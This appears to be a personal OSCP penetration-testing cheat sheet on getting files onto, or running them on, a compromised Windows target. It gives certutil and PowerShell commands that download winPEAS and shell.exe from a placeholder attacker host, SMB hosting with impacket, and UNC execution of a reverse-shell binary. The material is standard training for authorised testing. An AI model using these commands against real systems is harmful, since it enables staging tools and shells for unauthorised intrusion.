This note answers **one question only**:

> “I need to get a file onto (or run a file on) the target, what’s the best way _right now_?”


File transfer comes up **constantly**:

- After foothold
    
- Before privilege escalation
    
- During lateral movement
    
- When stabilizing shells

## **🔁 Transfer Decision Flow (Simple)**

1. Do I have **command execution**?
    
    - Yes → try HTTP or UNC
        
    
2. Do I have **RDP / GUI**?
    
    - Yes → SMB / File Explorer
        
    
3. Is SMB blocked?
    
    - Use HTTP
        
    
4. Is HTTP blocked?
    
    - Try SMB / PowerShell
        
    
5. Still stuck?
    
    - Go back and enumerate







## **🟢 Method 1 — HTTP Download (Most Reliable)**
This is the **default OSCP method**.
### **Attacker (Kali)**

```bash
cd ~/Desktop/staging
python3 -m http.server 80
```
Hosts files at:
`http://<KALI_IP>/<file>`


### **Victim (Windows) — certutil** 

```cmd
certutil.exe -f -urlcache http://<KALI_IP>/winPEASx64.exe winpeas.exe
```

- Downloads file
    
- Does **not** execute it
    
- You must run it manually after
    

Best for:

- winPEAS
    
- mimikatz
    
- payloads
    
- tools

### **Victim (Windows) — PowerShell**
```powershell
powershell -c "Invoke-WebRequest http://<KALI_IP>/shell.exe -OutFile shell.exe"
```
or 
```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://<KALI_IP>/shell.exe','shell.exe')"
```



## **🟡 Method 2 — UNC / SMB Execution (Post-Access)**

Covered in:

📄 UNC_Execution.md

Quick reminder: 
`\\<KALI_IP>\share\winrev.exe`

- Executes file immediately
    
- No download step
    
- Requires outbound SMB (445)
    
Best for:

- Re-triggering shells
- Running tools fast
- Lateral movement




## **Method 3 — SMB Share via File Explorer (GUI)**

Use this when:

- You have **RDP**
    
- You want manual control
    
### **Attacker (Kali)**
```bash
impacket-smbserver share .
```

### **Victim (Windows)**

In File Explorer address bar:
```bash
\\<KALI_IP>\share
```

Then:

- Copy files into C:\Users\Public
    
- Execute manually